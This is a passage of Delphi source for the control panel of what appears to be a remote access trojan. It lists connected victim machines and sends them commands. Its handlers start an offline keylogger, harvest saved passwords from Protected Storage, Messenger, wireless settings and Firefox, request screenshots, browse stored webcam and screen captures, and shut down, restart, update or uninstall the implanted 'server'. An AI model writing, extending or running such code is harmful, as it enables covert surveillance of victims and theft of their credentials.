  if LastSortedColumn <> nil then Listview1ColumnClick(Listview1,LastSortedColumn);
end;

procedure TConnectionForm.ShowThumbnails1Click(Sender: TObject);
var
  i,num: integer;
  Bmp: TBitmap;
  SocketData: TSocketData;
  NOT_ASSIGNED: string;
begin
  ShowThumbnails1.Checked := not ShowThumbnails1.Checked;
  ToolButton1.Down := ShowThumbnails1.Checked;

  Imagelist3.Clear;

  if ShowThumbnails1.Checked then begin
    Listview1.ViewStyle := vsIcon;
    Bmp := TBitmap.Create;
    Bmp.Width := 128;
    Bmp.Height := 128;
    NOT_ASSIGNED := 'Not Assigned';
    num := Bmp.Canvas.TextHeight(NOT_ASSIGNED);
    i := Bmp.Canvas.TextWidth(NOT_ASSIGNED);
    Bmp.Canvas.DrawFocusRect(Bmp.Canvas.ClipRect);
    //Bmp.Canvas.TextOut(Bmp.Width div 2 - i div 2,Bmp.Height div 2 - Num div 2,NOT_ASSIGNED);
    Imagelist3.Add(Bmp,nil);
    Bmp.Free;

    Listview1.Items.BeginUpdate;
    for i := 0 to Listview1.Items.Count -1 do begin
      Application.ProcessMessages;
      Listview1.Items[i].ImageIndex := 0;
    end;
    Listview1.Items.EndUpdate;

    for i := 0 to Listview1.Items.Count -1 do begin
      try
        Application.ProcessMessages;
        SocketData := TSocketData(Listview1.Items[i].Data);
        SendData(SocketData.MainSocket,'ScreenShot');
      except
      end;
    end;

  end else begin

    Listview1.ViewStyle := vsReport;
    for i := 0 to Listview1.Items.Count -1 do begin
      try
        Listview1.Items[i].ImageIndex := 0;
        SocketData := TSocketData(Listview1.Items[i].Data);
        if SocketData.MainSocket <> nil then Listview1.Items[i].ImageIndex := 1;
      except
      end;
    end;

  end;
end;

procedure TConnectionForm.TreeView1Collapsing(Sender: TObject;
  Node: TTreeNode; var AllowCollapse: Boolean);
begin
  if Node.Parent = nil then exit;
  AllowCollapse := False;
end;

procedure TConnectionForm.TreeView1DblClick(Sender: TObject);
var
  i: integer;
begin
  if not assigned(Treeview1.Selected) then exit;
  for i := 0 to PopupMenu1.Items.Count -1 do begin
    if PopupMenu1.Items[i].ImageIndex = Treeview1.Selected.ImageIndex then begin
      PopupMenu1.Items[i].Click;
      Break;
    end;
  end;
end;

procedure TConnectionForm.offlinekeylogger1Click(Sender: TObject);
var
  KeyLogger: TKeyLogger;
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  KeyLogger := TKeyLogger.Create(nil);
  KeyLogger.Panel2.BringToFront;
  KeyLogger.Active2.Checked := StrToBool(SocketData.ServerData.OfflineLogger);
  KeyLogger.Caption := SocketData.ServerData.Name + ' - Offline Key Logger - [Offline]';
  KeyLogger.SocketData := SocketData;
  KeyLogger.MainSocket := SocketData.MainSocket;
  KeyLogger.Offline := True;
  SocketData.Form := KeyLogger;
  KeyLogger.Group := SocketData.ServerData.Group;
  KeyLogger.Computer := SocketData.ServerData.Computer;
  KeyLogger.User := SocketData.ServerData.User;

  SendData(SocketData.MainSocket,'NewConnection|KeyLoggerSocket|' + inttostr(KeyLogger.Handle));
  KeyLogger.Show;
end;


procedure TConnectionForm.ProtectedStorage1Click(Sender: TObject);
var
  PasswordAudit: TPasswordAudit;
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  PasswordAudit := TPasswordAudit.Create(nil);
  PasswordAudit.PageControl1.ActivePageIndex := 1;
  PasswordAudit.Caption := SocketData.ServerData.Name + ' - Password Audit - Protected Storage - [Offline]';
  PasswordAudit.SocketData := SocketData;
  PasswordAudit.MainSocket := SocketData.MainSocket;
  PasswordAudit.Version := 2;
  PasswordAudit.Group := SocketData.ServerData.Group;
  PasswordAudit.Computer := SocketData.ServerData.Computer;
  PasswordAudit.User := SocketData.ServerData.User;

  SocketData.Form := PasswordAudit;
  SendData(SocketData.MainSocket,'NewConnection|PasswordAuditSocket|' + inttostr(PasswordAudit.Handle));
  PasswordAudit.Show;
end;



procedure TConnectionForm.Messenger1Click(Sender: TObject);
var
  PasswordAudit: TPasswordAudit;
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  PasswordAudit := TPasswordAudit.Create(nil);
  PasswordAudit.PageControl1.ActivePageIndex := 0;
  PasswordAudit.Caption := SocketData.ServerData.Name + ' - Password Audit - Messenger - [Offline]';
  PasswordAudit.SocketData := SocketData;
  PasswordAudit.MainSocket := SocketData.MainSocket;
  PasswordAudit.Version := 3;
  PasswordAudit.Group := SocketData.ServerData.Group;
  PasswordAudit.Computer := SocketData.ServerData.Computer;
  PasswordAudit.User := SocketData.ServerData.User;

  SocketData.Form := PasswordAudit;
  SendData(SocketData.MainSocket,'NewConnection|PasswordAuditSocket|' + inttostr(PasswordAudit.Handle));
  PasswordAudit.Show;
end;

procedure TConnectionForm.Wireless1Click(Sender: TObject);
var
  PasswordAudit: TPasswordAudit;
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  PasswordAudit := TPasswordAudit.Create(nil);
  PasswordAudit.PageControl1.ActivePageIndex := 2;
  PasswordAudit.Caption := SocketData.ServerData.Name + ' - Password Audit - Wireless - [Offline]';
  PasswordAudit.SocketData := SocketData;
  PasswordAudit.MainSocket := SocketData.MainSocket;
  PasswordAudit.Version := 1;
  PasswordAudit.Group := SocketData.ServerData.Group;
  PasswordAudit.Computer := SocketData.ServerData.Computer;
  PasswordAudit.User := SocketData.ServerData.User;

  SocketData.Form := PasswordAudit;
  SendData(SocketData.MainSocket,'NewConnection|PasswordAuditSocket|' + inttostr(PasswordAudit.Handle));
  PasswordAudit.Show;
end;

{function FindTransferManager(MainSocket: TCustomWinSocket; SocketData: TSocketData): TTransferManager;
var
  i: integer;
begin
  Result := nil;
  for i := 0 to Screen.FormCount -1 do begin
    if Screen.Forms[i].ClassType <> TTransferManager then Continue;
    if TTransferManager(Screen.Forms[i]).MainSocket = MainSocket then begin
      Result := TTransferManager(Screen.Forms[i]);
      Exit;
    end;
  end;
  if Result = nil then begin
    Result := TTransferManager.Create(nil);
    Result.Caption := SocketData.ServerData.Name + ' - Transfer Manager';
    Result.SocketData := SocketData;
    Result.MainSocket := SocketData.MainSocket;
    SocketData.Form := Result;
    UnitSharedData.SendData(MainSocket,'NewConnection|TransferManagerSocket|' + inttostr(Result.Handle));
  end;
end;}

procedure TConnectionForm.ransfers1Click(Sender: TObject);
var
  ScreenCapture: TScreenCapture;
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  ClientForm.FindTransferManager(SocketData.MainSocket,SocketData);
end;

procedure TConnectionForm.UserFolder1Click(Sender: TObject);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  ShellExecute(0,'explore',pchar(SocketData.MainPath),'','',SW_SHOWNORMAL);
end;

procedure TConnectionForm.ListView1CustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
var
  SocketData: TSocketData;
  r : TRect;
begin
  //exit;
  if Listview1.ViewStyle = vsReport then Listview1.Canvas.Brush.Color := $F7F7F7;

  if Item.Data = nil then begin
    Listview1.Canvas.Font.Color := Settings.ColorBox1.Selected;
    exit;
  end;
  SocketData := TSocketData(Item.Data);

  if SocketData.MainSocket = nil then begin
    Listview1.Canvas.Font.Color := Settings.ColorBox1.Selected;
  end else begin
    Listview1.Canvas.Font.Color := clBlack;
    if SocketData.NewConnection then Listview1.Canvas.Font.Style := [fsBold] else Listview1.Canvas.Font.Style := [];
    if GetTickCount - SocketData.ConnectedAt <= 4000 then Listview1.Canvas.Brush.Color := clGreen;
  end;


end;


procedure TConnectionForm.ListView1CustomDrawSubItem(Sender: TCustomListView; Item: TListItem; SubItem: Integer; State: TCustomDrawState; var DefaultDraw: Boolean);
var
  SocketData: TSocketData;
begin
  //exit;
  if Listview1.ViewStyle = vsReport then Listview1.Canvas.Brush.Color := clWhite;

  if Item.Data = nil then begin
    Listview1.Canvas.Font.Color := Settings.ColorBox1.Selected;
    exit;
  end;
  SocketData := TSocketData(Item.Data);

  if SocketData.MainSocket = nil then begin
    Listview1.Canvas.Font.Color := Settings.ColorBox1.Selected;
  end else begin
    Listview1.Canvas.Font.Color := clBlack; 
    if SubItem = 9 then begin
      if Item.SubItems[8] = 'Detected' then begin
        Listview1.Canvas.Font.Color := clgreen;
      end else begin
        Listview1.Canvas.Font.Color := clBlack;
      end;
    end else begin
      Listview1.Canvas.Font.Color := clBlack;
    end;
    if SocketData.NewConnection then Listview1.Canvas.Font.Style := [fsBold] else Listview1.Canvas.Font.Style := [];
    if GetTickCount - SocketData.ConnectedAt <= 4000 then Listview1.Canvas.Brush.Color := clGreen;
  end;

end;

procedure TConnectionForm.Shutdown1Click(Sender: TObject);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  SendData(SocketData.MainSocket,'Shutdown');
end;

procedure TConnectionForm.Reboot1Click(Sender: TObject);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  SendData(SocketData.MainSocket,'Reboot');
end;

procedure TConnectionForm.LogOff1Click(Sender: TObject);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  SendData(SocketData.MainSocket,'Logoff');
end;

procedure TConnectionForm.StatusBar1DrawPanel(StatusBar: TStatusBar;
  Panel: TStatusPanel; const Rect: TRect);
begin
  if Panel = StatusBar.Panels[1] then
  with Gauge2 do begin
    Top := Rect.Top;
    Left := Rect.Left;
    Width := Rect.Right - Rect.Left;
    Height := Rect.Bottom - Rect.Top;
  end;

  if Panel = StatusBar.Panels[3] then
  with Gauge1 do begin
    Top := Rect.Top;
    Left := Rect.Left;
    Width := Rect.Right - Rect.Left;
    Height := Rect.Bottom - Rect.Top;
  end;


end;


procedure TConnectionForm.Timer2Timer(Sender: TObject);
var
  SocketData: TSocketData;
begin
  try
    if not assigned(Listview1.Selected) then exit;
    if not Show1.Checked then exit;
    SocketData := TSocketData(Listview1.Selected.Data);
    if SocketData = nil then exit;
    SendData(SocketData.MainSocket,'Status');
  except
  end;
  Timer2.Enabled := False;
end;

procedure TConnectionForm.Close1Click(Sender: TObject);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  SendData(SocketData.MainSocket,'Close');
end;

procedure TConnectionForm.Share1Click(Sender: TObject);
var
  SocketData: TSocketData;
  i: integer;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  if ShareServer.ShowModal <> mrok then exit;
  for i := 0 to ShareServer.ListView1.Items.Count -1 do begin
    Sleep(10);
    Application.ProcessMessages;
    SendData(SocketData.MainSocket,'Share|' + ShareServer.Listview1.Items[i].Caption + '|' + ShareServer.Listview1.Items[i].SubItems[0] + '|' );
  end;
end;


procedure TConnectionForm.Uninstall1Click(Sender: TObject);
var
  SocketData: TSocketData;
begin
  if not assigned(Listview1.Selected) then exit;
  //if UninstallForm.ShowModal <> mrok then exit;
  if MsgBox('Uninstall','Do You Want To Uninstall Server',MB_YESNO + MB_ICONQUESTION) <> 'Yes' then exit;

  SocketData := TSocketData(Listview1.Selected.Data);
  SendData(SocketData.MainSocket,'Remove');
end;

procedure TConnectionForm.Ping1Click(Sender: TObject);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  SocketData.PingReceived := False;
  SocketData.PingSentAt := GetTickCount;
  SocketData.SentFirstPing := True;
  SendData(SocketData.MainSocket,'Ping');
end;

procedure TConnectionForm.Show1Click(Sender: TObject);
begin
  Show1.Checked := not Show1.Checked;
  ToolButton2.Down := Show1.Checked;
  Statusbar1.Visible := Show1.Checked;
end;

procedure TConnectionForm.ListView1Deletion(Sender: TObject; Item: TListItem);
begin
  UpdateCaption;
  {if (Listview1.Items.Count -1) = 0 then begin
    UpdateCaption;
    Listview1.OnDeletion := nil;
    TabSheet.Free;
  end;}
end;

procedure TConnectionForm.ToolButton1Click(Sender: TObject);
begin
  ShowThumbnails1.Click;
end;

procedure TConnectionForm.ToolButton2Click(Sender: TObject);
begin
  Show1.Click;
end;

procedure TConnectionForm.ToolButton3Click(Sender: TObject);
var
  SocketData: TSocketData;
begin
  if not assigned(Listview1.Selected) then exit;
  SocketData := TSocketData(Listview1.Selected.Data);
  ShellExecute(0,'explore',pchar(SocketData.MainPath),'','',SW_SHOWNORMAL);
end;

procedure TConnectionForm.Downloads1Click(Sender: TObject);
var
  SocketData: TSocketData;
begin
  if not assigned(Listview1.Selected) then exit;
  SocketData := TSocketData(Listview1.Selected.Data);
  ShellExecute(0,'explore',pchar(SocketData.DownloadPath),'','',SW_SHOWNORMAL);
end;

procedure TConnectionForm.Screen1Click(Sender: TObject);
var
  SocketData: TSocketData;
begin
  if not assigned(Listview1.Selected) then exit;
  SocketData := TSocketData(Listview1.Selected.Data);
  ShellExecute(0,'explore',pchar(SocketData.ScreenPath),'','',SW_SHOWNORMAL);
end;

procedure TConnectionForm.Webcam1Click(Sender: TObject);
var
  SocketData: TSocketData;
begin
  if not assigned(Listview1.Selected) then exit;
  SocketData := TSocketData(Listview1.Selected.Data);
  ShellExecute(0,'explore',pchar(SocketData.WebcamPath),'','',SW_SHOWNORMAL);
end;

procedure TConnectionForm.PopupMenu1Popup(Sender: TObject);
begin
  Ping1.Enabled := False;
  Share1.Enabled := False;
  UpdateServer1.Enabled := False;
  Close1.Enabled := False;
  Uninstall1.Enabled := False;
  EditIdentification1.Enabled := False;
  Restart1.Enabled := False;

  if not assigned(listview1.Selected) then exit;
  EditIdentification1.Enabled := True;
  
  if Listview1.Selected.SubItems[11] = '-' then exit;
  Ping1.Enabled := True;
  Restart1.Enabled := True;
  Share1.Enabled := True;
  UpdateServer1.Enabled := True;
  Close1.Enabled := True;
  Uninstall1.Enabled := True;
end;

procedure TConnectionForm.Firefox1Click(Sender: TObject);
var
  PasswordAudit: TPasswordAudit;
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  PasswordAudit := TPasswordAudit.Create(nil);
  PasswordAudit.PageControl1.ActivePageIndex := 3;
  PasswordAudit.Caption := SocketData.ServerData.Name + ' - Password Audit - Firefox - [Offline]';
  PasswordAudit.SocketData := SocketData;
  PasswordAudit.MainSocket := SocketData.MainSocket;
  PasswordAudit.Version := 4;
  PasswordAudit.Group := SocketData.ServerData.Group;
  PasswordAudit.Computer := SocketData.ServerData.Computer;
  PasswordAudit.User := SocketData.ServerData.User;

  SocketData.Form := PasswordAudit;
  SendData(SocketData.MainSocket,'NewConnection|PasswordAuditSocket|' + inttostr(PasswordAudit.Handle));
  PasswordAudit.Show;
end;

procedure TConnectionForm.Timer1Timer(Sender: TObject);
var
  i: integer;
  SocketData: TSocketData;
  Time: string;
  TimeSincePing: integer;
  Data: string;
  NewLi: TListItem;
  DisconnectProc: procedure(Socket: TCustomWinSocket);
begin
  try
    Timer1.Enabled := False;

  Time := inttostr(TTimer(Sender).Interval);

  for i := Listview1.Items.Count -1 downto 0 do begin

    Application.ProcessMessages;
    if Listview1.Items[i].Deleting then Continue;
    Application.ProcessMessages;
    if Listview1.Items[i].Data = nil then Continue;

    try

      Application.ProcessMessages;
      SocketData := TSocketData(Listview1.Items[i].Data);
      Application.ProcessMessages;
      if SocketData.MainSocket = nil then Continue;
      Application.ProcessMessages;

      if GetTickCount - SocketData.PingSentAt < 30000 then Continue;

      if not SocketData.PingReceived then begin
        Application.ProcessMessages;
        if SocketData.SentFirstPing then begin
          Application.ProcessMessages;
          if SocketData.Ping = '-' then SocketData.Ping := Time else SocketData.Ping := inttostr(strtoint(SocketData.Ping) +  strtoint(Time));
          Listview1.Items[i].SubItems[10] := SocketData.Ping;
        end;
      end;
      Application.ProcessMessages;

      SocketData.SentFirstPing := True;
      Application.ProcessMessages;
      SocketData.PingReceived := False;
      Application.ProcessMessages;
      SocketData.PingSentAt := GetTickCount;
      Application.ProcessMessages;
      Data := 'Ping';
      Data := Compress(SocketData,Data);
      Data := inttostr(Length(Data)) + '|' + Data;
      Application.ProcessMessages;

      try
        SocketData.MainSocket.SendText(Data);
      except

        Listview1.Items[i].ImageIndex := 0;
        SocketData.Ping := '-';
        SocketData.Idle := '-';
        Listview1.Items[i].SubItems[10] := '-';
        Listview1.Items[i].SubItems[11] := '-';
        if Settings.CheckBox6.Checked then DoPopup('Lost Connection',SocketData);

        if Settings.CheckBox12.Checked then begin
          Listview1.Items[i].Data := nil;
          Listview1.Items[i].Delete;
          SocketData.ListItem := nil;
        end else begin
          if ClientForm.GroupOnlineContatcs1.Checked then begin
            NewLi := SocketData.ConnectionForm.ListView1.Items.Add;
            NewLi.Assign(Listview1.Items[i]);
            NewLi.SubItemImages[1] := Listview1.Items[i].SubItemImages[1];
            NewLi.SubItemImages[8] := Listview1.Items[i].SubItemImages[8];
            SocketData.ListItem.Delete;
            SocketData.ListItem := NewLi;
          end;
        end;
        Application.ProcessMessages;
        UpdateCaption;

      end;
      Application.ProcessMessages;

    except
     Application.ProcessMessages;
    end;
  end;  //for loop

  finally
    TImer1.Enabled := True;
  end;
end;

procedure TConnectionForm.Restart1Click(Sender: TObject);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  SendData(SocketData.MainSocket,'RestartServer');
end;


procedure TConnectionForm.ListView1MouseDown(Sender: TObject;
  Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
var
  P:TPoint;
  Li: TListItem;
  SocketData: TSocketData;
  HitTest: THitTests;
  Ini: TIniFile;
begin

  HitTest := Listview1.GetHitTestInfoAt(X,Y);
  if (htOnStateIcon in HitTest) then begin

    Li := Listview1.GetItemAt(X,Y);
    if Li = nil then exit;
    if Li.Data = nil then exit;
    SocketData := TSocketData(Li.Data);

    if Li.StateIndex = 0 then begin
      Li.StateIndex := 1;
      SocketData.ServerData.Special := 'True';
    end else begin
      Li.StateIndex := 0;
      SocketData.ServerData.Special := 'False';
    end;

    Ini := TIniFile.Create(SocketData.MainPath + 'Settings.Ini');
    Ini.WriteString('Identification','Special',SocketData.ServerData.Special);
    Ini.Free;

  end;
end;

procedure TConnectionForm.Timer3Timer(Sender: TObject);
begin
  Listview1.Refresh;
end;

procedure TConnectionForm.ToolButton5Click(Sender: TObject);
var
  SocketData: TSocketData;
  i: integer;
begin
  SocketData := TSocketData(Listview1.Selected.Data);
  Notes.RichEdit1.Text := '';
  try
    Notes.RichEdit1.Lines.LoadFromFile(SocketData.MainPath + 'Notes');
  except
  end;
  if Notes.ShowModal <> mrok then exit;
  try
    Notes.RichEdit1.Lines.SaveToFile(SocketData.MainPath + 'Notes');
  except
  end;
end;

end.
